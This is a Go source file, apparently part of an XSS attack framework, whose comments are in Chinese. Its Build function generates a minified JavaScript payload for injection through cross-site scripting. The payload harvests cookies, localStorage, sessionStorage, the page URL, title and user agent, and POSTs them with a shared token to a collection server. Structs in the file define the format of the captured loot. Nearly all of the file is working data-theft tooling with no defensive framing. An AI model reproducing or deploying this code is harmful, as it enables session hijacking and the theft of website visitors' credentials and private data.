package xsshook

import (
	"encoding/json"
	"strings"
)

// BuildOptions 生成窃密载荷所需的填充数据。
type BuildOptions struct {
	PayloadID string // 已入库载荷的 ID（载荷脚本用其标记收割归属）
	BeaconURL string // 收集服务根地址，例如 http://host:port（脚本在末尾拼 /api/xss/capture）
	Token     string // 与收集服务约定的共享密钥（X-XSS-Token）
}

// Build 渲染一段浏览器侧窃密脚本：收集 document.cookie、localStorage、sessionStorage、
// 当前 URL/哈希/标题/UA，并回连收集服务。脚本本身不携带任何注释，便于直接注入 XSS 载荷。
func Build(o BuildOptions) string {
	beacon := strings.TrimRight(o.BeaconURL, "/") + "/api/xss/capture"
	js := `(function(){var b=JSpL_BASE;var t=JSpL_TOKEN;var p=JSpL_PID;function c(){var d={payload_id:p,source_url:document.location.href,page_title:document.title,user_agent:navigator.userAgent,url_fragment:document.location.hash,cookies:[],local_storage:{},session_storage:{}};try{var m=document.cookie?document.cookie.split(";"):[];for(var i=0;i<m.length;i++){var kv=m[i].split("=");if(!kv[0])continue;d.cookies.push({name:kv[0].trim(),value:kv.slice(1).join("=").trim()});}}catch(e){}try{for(var k in localStorage){try{d.local_storage[k]=localStorage.getItem(k);}catch(e){}}}catch(e){}try{for(var s in sessionStorage){try{d.session_storage[s]=sessionStorage.getItem(s);}catch(e){}}}catch(e){}var body;try{body=JSON.stringify(d);}catch(e){d.cookies=[];body=JSON.stringify(d);}try{var x=new XMLHttpRequest();x.open("POST",b,true);x.setRequestHeader("Content-Type","application/json;charset=UTF-8");x.setRequestHeader("X-XSS-Token",t);x.send(body);}catch(e){}}if(document.readyState==="complete"||document.readyState==="interactive"){c();}else{window.addEventListener("load",function(){c();});}setTimeout(c,700);})();`
	js = strings.Replace(js, "JSpL_BASE", str(beacon), 1)
	js = strings.Replace(js, "JSpL_TOKEN", str(o.Token), 1)
	js = strings.Replace(js, "JSpL_PID", str(o.PayloadID), 1)
	return js
}

// str 将任意字符串编码为可直接嵌入 JS 源码的字符串字面量。
func str(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// CaptureRequest 收割回连的请求体（与前端脚本发送的字段一一对应）。
type CaptureRequest struct {
	PayloadID      string            `json:"payload_id"`
	SourceURL      string            `json:"source_url"`
	PageTitle      string            `json:"page_title"`
	UserAgent      string            `json:"user_agent"`
	URLFragment    string            `json:"url_fragment"`
	Cookies        []Cookie          `json:"cookies"`
	LocalStorage   map[string]string `json:"local_storage"`
	SessionStorage map[string]string `json:"session_storage"`
}

// Cookie 脚本在目标端读到的 Cookie（HttpOnly 不会出现在 document.cookie 中）。
type Cookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain,omitempty"`
	Path     string `json:"path,omitempty"`
	Secure   *bool  `json:"secure,omitempty"`
	HttpOnly *bool  `json:"http_only,omitempty"`
}
